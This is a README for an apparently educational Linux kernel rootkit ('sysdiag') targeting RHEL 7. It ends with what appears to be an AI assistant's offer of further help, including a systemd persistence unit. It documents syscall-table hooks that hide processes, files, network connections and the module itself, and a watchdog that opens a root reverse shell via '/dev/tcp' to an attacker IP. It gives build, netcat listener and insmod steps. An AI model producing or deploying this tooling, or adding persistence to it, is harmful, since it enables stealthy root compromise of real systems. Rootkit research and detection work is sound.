sysdiag — Educational LKM Rootkit (FYP)
⚠️ For educational / research use ONLY. Build and load exclusively on systems you own, in isolated lab environments. Unauthorized use on any other system is illegal.

A minimal Linux kernel-module rootkit demonstrating syscall-table hooking on RHEL 7.x / Oracle Linux 7.x (kernel 3.10.0-1160). ~450 lines of commented C across 9 files.

Features
Feature
Mechanism
Reverse shell (root)	Kernel watchdog thread respawns bash whenever it dies
Auto-install	Creates a renamed bash copy (/usr/sbin/sysdiag_sh) on first spawn
Process hiding	getdents/getdents64 filter: /proc/<pid> of the shell never listed
File/dir hiding	Same filter: anything named sysdiag* invisible to ls
Module hiding	Removed from kernel module list (lsmod blind); toggled via kill -33 1
Connection hiding	read hook filters the port's lines from /proc/net/tcp (netstat)
dmesg hygiene	Taint messages filtered from /dev/kmsg; taint flag cleared
Symbol hiding	Module's symbols filtered from /proc/kallsyms
Configurable	attacker_ip / attacker_port set at load time — no rebuild needed

How it works
text

insmod sysdiag.ko attacker_ip=X attacker_port=4444
        │
        ├─ kallsyms_lookup_name("sys_call_table")
        ├─ CR0.WP bit cleared → 4 syscall pointers swapped (read, getdents, getdents64, kill)
        ├─ watchdog kthread starts (checks every 5s for "sysdiag_sh")
        └─ taint flag cleared

watchdog finds no shell → call_usermodehelper() as root:
    cp /bin/bash /usr/sbin/sysdiag_sh && exec sysdiag_sh -i >& /dev/tcp/X/4444

every ls / netstat / ps on the victim now goes through the hooks:
    getdents  → hides /proc/<pid>+sysdiag* entries (process, files, /sys/module)
    read      → hides ":115C" lines (netstat), taint lines (dmesg), module symbols
    kill -33  → toggle module visibility in lsmod
Design decision: hooks live in sys_call_table (one pointer per syscall) — swap 4 entries, restore on unload. Chosen over ftrace-based hooking (used by modern rootkits like rasta) because RHEL 7's kernel 3.10 predates the required IPMODIFY API.

Requirements
RHEL 7.x / Oracle Linux 7.x / CentOS 7 — kernel 3.10.0-1160.x (RHCK, not UEK)
kernel-devel exactly matching the running kernel
Root access
Build
bash

sudo yum install -y gcc make kernel-devel-$(uname -r) kernel-headers
git clone <your-repo-url>
cd sysdiag
ls /lib/modules/$(uname -r)/build     # must be a valid symlink
make
Clean output must end with LD [M] sysdiag.ko and no warnings.

Run
1. Start the listener on the attacker machine:

bash

nc -lvnp 4444
2. Load the module on the target:

bash

sudo insmod sysdiag.ko attacker_ip=<ATTACKER_IP> attacker_port=4444
The shell connects within ~5 seconds.

3. Verify hiding (on target):

bash

ps aux | grep sysdiag_sh        # nothing — process hidden
ls /usr/sbin | grep sysdiag     # nothing — binary hidden (stat still finds it)
netstat -tanp | grep 4444       # nothing — connection hidden
lsmod | grep sysdiag            # visible; kill -33 1 toggles
Control & Uninstall
bash

kill -33 1                      # toggle: hide/show module in lsmod
kill -33 1 && rmmod sysdiag     # proper unload (unhide first!)
rm -f /usr/sbin/sysdiag_sh      # remove shell binary
Unloading automatically restores all 4 original syscall pointers and stops the watchdog.

Limitations (known & documented)
ss still shows the connection (uses netlink SOCK_DIAG, not /proc/net/tcp)
One-time "module taint" line may appear in journalctl -k (kernel log, not kmsg reads)
Filter hides the port for all connections, not just ours (false positives by design)
Not persistent across reboots (no systemd/cron — by scope)
Structure
text

sysdiag.c            module entry: params, hook table, init/exit
ftrace/ftrace.h      engine: sys_call_table lookup + CR0.WP pointer swap
hooks/getdents.h     shared dir-entry filter (files + process hiding)
hooks/getdents64.h   64-bit readdir variant
hooks/kill.h         kill -33 control channel + module hide/show
hooks/read.h         /proc/net/tcp, /dev/kmsg, /proc/kallsyms filters
kprobe/rev-shell.h   watchdog thread + shell respawn logic
include/headers.h    kernel includes (3.10)
Makefile             kbuild wrapper
Credits
Based on techniques from the public rootkit literature: rasta, Reptile (both studied during research), and the classic THC LKM-hacking papers (1999).

Save as README.md in the repo root and push. (Tip: the ASCII diagram makes great viva material — you'll be asked "walk me through what happens on insmod" at least once.)

Next up — pick one: (a) test-plan table for the methodology chapter, (b) report skeleton, (c) detection/countermeasures section, (d) systemd persistence unit (confirm supervisor first).



